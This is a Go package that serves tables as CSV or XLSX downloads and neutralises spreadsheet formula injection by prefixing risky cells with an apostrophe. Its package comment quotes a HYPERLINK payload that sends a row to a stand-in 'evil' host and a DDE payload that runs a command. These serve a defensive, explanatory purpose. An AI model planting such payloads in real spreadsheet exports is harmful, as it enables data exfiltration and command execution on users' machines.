// Package table serves one table of strings — a header and its rows —
// as a download, in CSV or XLSX, and holds the one security rule every
// CSV export needs.
//
// It is a separate package from xlsx on purpose. xlsx is a file format
// and reads as well as writes (an importer needs it with no HTTP in
// sight); this package is export policy: which bytes a table becomes,
// and which of them must be defused first.
//
// # CSV formula injection
//
// A cell someone typed — a name, an organisation, a free-text answer —
// becomes a LIVE FORMULA the moment the export is opened in Excel,
// Sheets or LibreOffice, if it begins with =, +, -, @, a tab or a
// carriage return. =HYPERLINK("https://evil/?"&A1,"click") sends the row
// away; the DDE shape =cmd|'/c calc'!A1 (and its +, - and @ variants)
// can run a command. The data is untrusted end to end, so the defence
// is applied to every cell, headers included (a header can carry a
// label somebody typed).
//
// The neutralisation is OWASP's: one leading apostrophe, so the
// spreadsheet reads the whole cell as text. It is applied ONLY to CSV.
// The XLSX path writes inline-string cells, which a spreadsheet never
// evaluates, so guarding there would corrupt values for no gain.
//
// A cell that is a plain signed number ("-50", "+3.5") is left alone:
// it is inert in every spreadsheet, and quoting it would turn a
// report's figures into text. A formula payload never parses as a bare
// number, so nothing dangerous gets through that exception.
//
// Ported from Tito Go's csv_guard.go and serve_table.go, where every
// report export goes through it.
package table

import (
	"bytes"
	"encoding/csv"
	"errors"
	"fmt"
	"mime"
	"net/http"
	"strconv"

	"amadan.net/rastrillo/rastrillo/xlsx"
)

// ErrTooBigForXLSX is what Serve returns, having written nothing, for a
// table past Excel's limits.
var ErrTooBigForXLSX = errors.New("table: too big for an XLSX workbook")

// The two formats Serve writes. Anything else a caller passes — it is
// usually a query parameter — is served as CSV.
const (
	CSV  = "csv"
	XLSX = "xlsx"
)

// Guard returns field with a leading apostrophe if a spreadsheet would
// otherwise evaluate it, and unchanged if not. Use it wherever untrusted
// text reaches a CSV writer that is not Serve.
func Guard(field string) string {
	if field == "" {
		return field
	}
	switch field[0] {
	case '=', '+', '-', '@', '\t', '\r':
		if _, err := strconv.ParseFloat(field, 64); err == nil {
			return field
		}
		return "'" + field
	}
	return field
}

// GuardRow returns a copy of rec with every cell put through Guard.
func GuardRow(rec []string) []string {
	out := make([]string, len(rec))
	for i, f := range rec {
		out[i] = Guard(f)
	}
	return out
}

// Export is one table as a download.
type Export struct {
	// Filename is the download's name without its extension; Serve adds
	// ".csv" or ".xlsx".
	Filename string
	// Sheet names the XLSX tab. Empty means Filename. xlsx.SheetName
	// makes whatever it is into a name Excel will open.
	Sheet  string
	Header []string
	Rows   [][]string
}

// Serve writes e as an attachment in format: XLSX when format is XLSX,
// CSV otherwise.
//
// A table too big for a workbook (Excel's column, row or cell-length
// limits) is refused before anything is written, so the caller can
// still answer — offer CSV, say — and check it with
// errors.Is(err, ErrTooBigForXLSX). Any other error comes after the
// response has started, from a client that went away, and can only be
// logged.
func Serve(w http.ResponseWriter, format string, e Export) error {
	if format != XLSX {
		format = CSV
	}
	var workbook bytes.Buffer
	if format == XLSX {
		// Built whole before the headers go out: a zip is written in one
		// piece at the end anyway, and building it first is what lets a
		// refusal still be answered.
		sheet := e.Sheet
		if sheet == "" {
			sheet = e.Filename
		}
		// Never guarded: inline strings are never formulas, and a guard
		// here would only corrupt the values.
		if err := xlsx.Write(&workbook, sheet, append([][]string{e.Header}, e.Rows...)); err != nil {
			return fmt.Errorf("%w: %w", ErrTooBigForXLSX, err)
		}
	}
	// mime.FormatMediaType quotes the name and, for a name that is not
	// plain ASCII, switches to RFC 2231's filename*= form, so a download
	// called "Müller" keeps its name instead of breaking the header.
	w.Header().Set("Content-Disposition", mime.FormatMediaType("attachment", map[string]string{"filename": e.Filename + "." + format}))
	if format == XLSX {
		w.Header().Set("Content-Type", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")
		_, err := workbook.WriteTo(w)
		return err
	}
	w.Header().Set("Content-Type", "text/csv; charset=utf-8")
	cw := csv.NewWriter(w)
	if err := cw.Write(GuardRow(e.Header)); err != nil {
		return err
	}
	for _, row := range e.Rows {
		if err := cw.Write(GuardRow(row)); err != nil {
			return err
		}
	}
	cw.Flush()
	return cw.Error()
}
